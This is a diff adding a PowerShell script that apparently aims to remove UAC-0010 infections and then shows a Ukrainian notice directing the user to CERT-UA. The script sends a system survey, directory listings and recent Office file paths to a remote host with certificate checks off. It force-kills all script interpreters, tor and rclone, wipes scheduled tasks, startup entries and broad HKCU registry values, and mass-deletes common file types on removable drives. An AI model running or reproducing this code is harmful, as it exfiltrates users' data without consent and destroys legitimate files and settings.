@@ -1,0 +1,245 @@
+$success = $false
+$mutex = New-Object System.Threading.Mutex($true, "crimeaisukraine", [ref] $success)
+if (!$success) {
+	exit 0
+}
+
+New-PSDrive -Name HKLM -PSProvider Registry -Root HKEY_LOCAL_MACHINE -ErrorAction SilentlyContinue
+New-PSDrive -Name HKCU -PSProvider Registry -Root HKEY_CURRENT_USER -ErrorAction SilentlyContinue
+New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT -ErrorAction SilentlyContinue
+
+$officeBase = "HKCU:\Software\Microsoft\Office"
+$officeVersions = @("11.0", "12.0", "14.0", "15.0", "16.0", "17.0")
+$officeProducts = @("Excel", "PowerPoint", "Word", "Access")
+$mruList = @()
+$BaseUri = "https://exorcise.me/crimeaisukraine"
+$HostID = "$env:COMPUTERNAME--$env:USERNAME--$env:DOMAIN"
+
+function SendRequest {
+	param(
+		[string]$Uri,
+		$Body = $null
+	)
+	$method  = 'GET'
+	$payload = $null
+	if ($Body -ne $null) {
+		if (($Body -is [object[]]) -or ($Body -is [string[]])) {
+			$Body = [string]::Join([System.Environment]::NewLine, $Body)
+		}
+		if ($Body -is [string]) { $Body = [System.Text.Encoding]::UTF8.GetBytes($Body) }
+		$payload = [System.Convert]::ToBase64String($Body)
+		$method  = 'POST'
+	}
+
+	$doRequest = {
+		param([string]$TargetUri)
+		[System.Net.ServicePointManager]::ServerCertificateValidationCallback = [System.Net.Security.RemoteCertificateValidationCallback]{ param($s,$c,$ch,$e) $true }
+		[System.Net.ServicePointManager]::Expect100Continue = $false
+		$req = [System.Net.HttpWebRequest]::Create($TargetUri)
+		$req.Method	= $method
+		$req.UserAgent = 'Mozilla/5.0 (Windows NT; PowerShell)'
+		$req.Timeout   = 60000
+
+		if ($method -eq 'POST') {
+			$req.ContentType = 'text/plain'
+			$sw = New-Object System.IO.StreamWriter($req.GetRequestStream())
+			$sw.Write($payload); $sw.Close()
+		}
+
+		$res = $req.GetResponse()
+		try {
+			$sr = New-Object System.IO.StreamReader($res.GetResponseStream())
+			$txt = $sr.ReadToEnd()
+			$sr.Close()
+			return $txt
+		} finally {
+			$res.Close()
+		}
+	}
+
+	try {
+		return (& $doRequest $Uri)
+	} catch {
+
+		$u = [uri]$Uri
+		if ($u.Scheme -ieq 'https') {
+			$b = New-Object System.UriBuilder $u
+			$b.Scheme = 'http'
+			$b.Port   = -1
+			$fallback = $b.Uri.AbsoluteUri
+			try {
+				return (& $doRequest $fallback)
+			} catch {
+				throw "HTTPS failed and HTTP fallback failed: $($_.Exception.Message)"
+			}
+		} else {
+			throw "Request failed: $($_.Exception.Message)"
+		}
+	}
+}
+
+$survey  = (systeminfo)
+$survey += (netstat -nao)
+$survey += (tasklist /svc)
+$survey += (echo "`r`nDesktop folder:")
+$survey += (dir "$env:USERPROFILE\Desktop")
+$survey += (echo "`r`nDownloads folder:")
+$survey += (dir "$env:USERPROFILE\Downloads")
+
+:outer foreach ($version in $officeVersions) {
+	foreach ($app in $officeProducts) {
+		$keyPath = "$officeBase\$version\$app\File MRU"
+		if (Test-Path $keyPath) {
+			$reg = Get-ItemProperty -Path $keyPath
+			$items = $reg.PSObject.Properties | Where-Object { $_.Name -match '^Item \d+$' }
+			foreach ($item in $items) {
+				if ($item.Value -match '\*(.+)$') {
+					$mruList += $matches[1]
+					if ($mruList.Count -ge 1000) { break :outer }
+				}
+			}
+		}
+	}
+}
+
+$mruFiles = ($mruList | Select-Object -First 1000) -join "|**|"
+
+$survey += (echo "`r`nMRU Files:")
+$survey += $mruFiles
+
+SendRequest -Uri "$BaseUri/surveyed-$HostID" -Body $survey
+
+$scheduler = New-Object -ComObject Schedule.Service
+$scheduler.Connect("")
+
+function GetScheduledTasks
+{
+	param(
+		$Folder = ""
+	)
+
+	$taskFolder = $scheduler.GetFolder($Folder)
+	$taskFolder.GetTasks(1)
+	$taskFolder.GetFolders(0) | ForEach-Object {
+		$PSBoundParameters.Folder = $_.Path
+		GetScheduledTasks @PSBoundParameters
+	}
+}
+
+GetScheduledTasks | 
+Where-Object {
+	$_.Definition.Actions | Where-Object {
+		($_.Path -match "powershell|wscript|cscript") -or 
+		($_.Arguments -match "powershell|wscript|cscript")
+	}
+} | 
+ForEach-Object {
+	$taskPath = $_.Path
+
+	try {		
+		$_.Stop(0)
+	}
+	catch {
+		Write-Error "Error stopping task ${taskPath}: $_"
+	}
+
+	try {
+		$rootFolder = $scheduler.GetFolder("")
+		$rootFolder.DeleteTask($taskPath, 0)
+	}
+	catch {
+		Write-Error "Error deleting task ${taskPath}: $_"
+	}
+}
+
+$CurrentPID = [System.Diagnostics.Process]::GetCurrentProcess().Id
+Get-Process -Name @("powershell", "wscript", "cscript", "tor", "rclone") -ErrorAction SilentlyContinue | Where-Object { $_.Id -ne $CurrentPID } | Stop-Process -Force -ErrorAction SilentlyContinue
+
+foreach ($subkey in @("Run", "RunOnce")) {
+	Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\$subkey" -Name * -ErrorAction SilentlyContinue
+}
+Remove-ItemProperty -Path "HKCU:\Environment" -Name UserInitMprLogonScript -ErrorAction SilentlyContinue
+Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\*" -Recurse -Force -ErrorAction SilentlyContinue
+
+foreach ($subkey in @("Abstractions", "AppEvents", "Cursors", "EUDC", "Keyboard Layout", "Microsoft", "Network", "Printers", "Software", "System")) {
+	Remove-ItemProperty -Path "HKCU:\$subkey" -Name * -ErrorAction SilentlyContinue
+}
+
+[System.IO.DriveInfo]::GetDrives() | 
+Where-Object { ($_.DriveType -eq [System.IO.DriveType]::Removable) -and $_.IsReady } | 
+ForEach-Object {
+	Get-ChildItem $_.RootDirectory -Include @("trash.dat", "trash.dll", "*.lnk", "*.tmp", "*.lag", "*.bin", "*.sys", "*.drv", "*.log", "*.ini", "*.bar", "*.ely", "*.dat", "*.vxd", "*.inf") -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+}
+
+foreach ($templates in @("Templates", "Шаблоны", "Шаблони")) {
+	Remove-Item -Path "$env:APPDATA\Microsoft\$templates\Normal.dotm" -Force -ErrorAction SilentlyContinue
+}
+
+SendRequest -Uri "$BaseUri/cleaned-$HostID"
+
+$openCmd = "$env:SystemRoot\notepad.exe ""%1"""
+foreach ($filetype in @("htafile", "JSEFile", "JSFile", "VBEFile", "VBSFile", "WSFFile", "WSHFile")) {
+	Set-ItemProperty -Path "HKCR:\$filetype\Shell\Open\Command" -Name "(Default)" -Value $openCmd -ErrorAction SilentlyContinue
+	Set-ItemProperty -Path "HKCR:\$filetype\Shell\Open2\Command" -Name "(Default)" -Value $openCmd -ErrorAction SilentlyContinue
+}
+
+foreach ($hive in @("HKCU:", "HKLM:")) {
+	$keyPath = "$hive\Software\Microsoft\Windows Script Host\Settings"
+	New-Item -Path $keyPath -Force -ErrorAction SilentlyContinue
+	Set-ItemProperty -Path $keyPath -Name "Enabled" -Value 0 -ErrorAction SilentlyContinue
+}
+
+foreach ($version in $officeVersions) {
+	foreach ($app in $officeProducts) {
+		$keyPath = "$officeBase\$version\$app\Security"
+		Set-ItemProperty -Path $keyPath -Name "VBAWarnings" -Value 4 -ErrorAction SilentlyContinue
+		Set-ItemProperty -Path $keyPath -Name "AccessVBOM" -Value 0 -ErrorAction SilentlyContinue
+	}
+}
+
+Set-ItemProperty -Path "$officeBase\Common\Security" -Name "DisableAllActiveX" -Value 1 -ErrorAction SilentlyContinue
+
+SendRequest -Uri "$BaseUri/hardened-$HostID"
+
+function CreateTask
+{
+	param(
+		$taskName,
+		$filePath
+	)
+
+	$task = $scheduler.NewTask(0)
+	$task.Principal.UserId = "$env:USERNAME"
+	$task.Principal.LogonType = 3
+	$task.Settings.DisallowStartIfOnBatteries = $false
+	$task.Settings.StartWhenAvailable = $true
+
+	$tr = $task.Triggers.Create(1)
+	$tr.Enabled = $true
+	$tr.StartBoundary = (Get-Date).AddSeconds(10).ToString("yyyy-MM-dd'T'HH:mm:ss")
+
+	$tr = $task.Triggers.Create(9)
+	$tr.UserId = "$env:USERNAME"
+	$tr.Delay = "PT10S"
+	$tr.Enabled = $true
+	$tr.StartBoundary = (Get-Date).ToString("yyyy-MM-dd'T'HH:mm:ss")
+
+	$a = $task.Actions.Create(0)
+	$a.Path = "$env:SystemRoot\notepad.exe"
+	$a.Arguments = "/w ""$filePath"""
+
+	$a = $task.Actions.Create(0)
+	$a.Path = "$env:SystemRoot\System32\schtasks.exe"
+	$a.Arguments = "/delete /tn ""$taskName"" /f"
+
+	$scheduler.GetFolder("\").RegisterTaskDefinition($taskName, $task, 6, $null, $null, 3, $null)
+}
+
+$msg  = "Шановний користувач!`r`n"
+$msg += "Ваш комп'ютер $env:COMPUTERNAME уражено шкідливим програмним забезпеченням угрупування UAC-0010 (ФСБ Росії).`r`n"
+$msg += "Невідкладно зверніться до CERT-UA (+380442818825, cert@cert.gov.ua) або (для в/с) Центру кібернетичної безпеки ІТС в/ч А0334 (+380673321891, csoc@post.mil.gov.ua)!`r`n"
+
+$ts = (Get-Date).ToString("s") -replace ":", "-"
+$tmp = "$env:TEMP\uac0010_$ts.txt"
+Set-Content -Path $tmp -Value $msg -Encoding Unicode
+CreateTask "ShowUAC0010Note" $tmp
